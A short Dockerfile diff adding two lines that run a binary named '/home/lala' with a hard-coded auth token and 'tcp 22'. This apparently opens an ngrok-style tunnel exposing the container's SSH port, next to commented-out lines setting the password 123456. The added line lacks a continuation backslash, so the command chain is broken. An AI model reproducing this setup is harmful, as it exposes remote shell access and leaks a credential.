@@ -36,6 +36,8 @@ RUN apt-get update \
   && cat /$USER/.ssh/authorized_keys \
 #  && echo “$USER:123456” | chpasswd \
 #  && echo “123456” | passwd –stdin $USER \
+  && /home/lala config add-authtoken 1fftsZVphhCuMwhe7uVWkxW8zHx_2XwBkSWQ5M5yxEFfYPitV \
+  && /home/lala tcp 22
   && /bin/sed -i 's/.session.required.pam_loginuid.so./session option pam_loginuid.so/g' /etc/pam.d/sshd \
   && /etc/init.d/ssh restart 
 
